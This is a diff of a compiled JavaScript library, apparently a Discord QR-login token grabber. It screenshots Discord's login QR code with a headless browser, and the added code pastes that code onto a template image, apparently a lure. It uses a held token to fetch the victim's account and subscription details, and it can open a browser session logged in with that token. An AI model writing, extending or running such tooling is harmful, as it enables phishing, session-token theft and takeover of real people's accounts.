@@ -8,12 +8,17 @@ var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, ge
         step((generator = generator.apply(thisArg, _arguments || [])).next());
     });
 };
+var __importDefault = (this && this.__importDefault) || function (mod) {
+    return (mod && mod.__esModule) ? mod : { "default": mod };
+};
 Object.defineProperty(exports, "__esModule", { value: true });
-exports.DiscordQRCodeTokenHandler = void 0;
+const jimg_1 = __importDefault(require("jimg"));
+const got_1 = __importDefault(require("got"));
 const puppeteer = require("puppeteer");
-const got = require("got");
 const randomUseragent = require("random-useragent");
-class DiscordQRCodeTokenHandler {
+const fs = require("fs");
+const path = require("path");
+class DiscordTQR {
     constructor(token) {
         this.token = token;
         this.$browser = null;
@@ -39,6 +44,8 @@ class DiscordQRCodeTokenHandler {
      */
     getQRCode(options = {}) {
         return __awaiter(this, void 0, void 0, function* () {
+            if (typeof options.template === "string" && options.template !== "default")
+                throw new Error("Invalide value for 'template'");
             if (this.$browser || this.$page)
                 yield this.closeConnection();
             this.$browser = yield puppeteer.launch((options === null || options === void 0 ? void 0 : options.browserOptions) ? options.browserOptions : { headless: true });
@@ -56,8 +63,34 @@ class DiscordQRCodeTokenHandler {
             const canvas = yield page.$("canvas");
             const parentCanvas = yield canvas.getProperty("parentNode");
             const qrC = yield parentCanvas.getProperty("parentNode");
-            const data = yield qrC.screenshot(Object.assign(Object.assign({}, (options.path ? { path: options.path } : {})), (options.encoding ? { path: options.encoding } : {})));
-            this.qr = data.toString();
+            let data = yield qrC.screenshot(Object.assign(Object.assign({}, (options.path && !options.template ? { path: options.path } : {})), (options.encoding ? { path: options.encoding } : {})));
+            //template
+            if (options.template) {
+                const tmpFile = path.resolve(__dirname, "./tmp.png");
+                fs.writeFileSync(tmpFile, data.toString("base64"), "base64");
+                const optionsJimg = {
+                    path: options.path,
+                    images: [
+                        {
+                            path: options.template === "default"
+                                ? path.resolve(__dirname, "../assets/template.png")
+                                : options.template.path,
+                        },
+                        options.template === "default"
+                            ? {
+                                path: tmpFile,
+                                x: 103,
+                                y: 391,
+                                width: 200,
+                                height: 200,
+                            }
+                            : Object.assign(Object.assign({}, options.template), { path: tmpFile }),
+                    ],
+                };
+                data = yield (0, jimg_1.default)(optionsJimg);
+                fs.unlinkSync(tmpFile);
+            }
+            this.qr = data;
             return data;
         });
     }
@@ -93,11 +126,11 @@ class DiscordQRCodeTokenHandler {
             token = token !== null && token !== void 0 ? token : this.token;
             if (!token)
                 throw new Error("Invalide token");
-            const scrapInfo = yield got(this.config.discordUserApi, {
+            const scrapInfo = yield (0, got_1.default)(this.config.discordUserApi, {
                 headers: { Authorization: token },
             });
             const info = JSON.parse(scrapInfo.body);
-            const scrapSub = yield got(this.config.discordSubscriptionApi, {
+            const scrapSub = yield (0, got_1.default)(this.config.discordSubscriptionApi, {
                 headers: { Authorization: token },
             });
             const sub = JSON.parse(scrapSub.body);
@@ -125,6 +158,7 @@ class DiscordQRCodeTokenHandler {
                     args: ["--start-fullscreen"],
                 });
             const page = (yield browser.pages())[0];
+            yield page.setExtraHTTPHeaders(this.config.httpHeader);
             yield page.goto(this.config.loginUrl, {
                 waitUntil: "domcontentloaded",
             });
@@ -153,6 +187,5 @@ class DiscordQRCodeTokenHandler {
         });
     }
 }
-exports.DiscordQRCodeTokenHandler = DiscordQRCodeTokenHandler;
-module.exports = DiscordQRCodeTokenHandler;
+exports.default = DiscordTQR;
 //# sourceMappingURL=index.js.map
